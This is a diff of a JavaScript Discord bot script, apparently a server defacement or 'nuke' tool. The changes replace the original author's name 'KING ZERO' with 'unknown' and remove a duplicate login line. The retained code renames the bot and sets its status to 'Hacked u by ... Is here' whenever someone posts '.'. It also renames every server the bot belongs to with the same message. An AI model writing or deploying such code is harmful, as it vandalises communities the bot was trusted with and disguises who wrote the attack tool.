@@ -11,7 +11,7 @@ console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('      ~            ~  By : KING ZERO ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  jamal " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+console.log(`Logged in as  * [ "  Randy " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
         
     
@@ -40,13 +40,13 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/3
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by KING ZERO Is here")
+LOka.user.setUsername("Hacked u by unknown Is here")
 
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by KING ZERO Is here`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
 
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u by KING ZERO Is here`)
+             m.setName(`Hacked u by unknown Is here`)
 })
 }
 });
@@ -486,10 +486,5 @@ LOka.on('guildMemberAdd', member => {
             }
         
     });
-
-
-
-client.login(process.env.TOKEN);
-
 
 client.login(process.env.TOKEN);
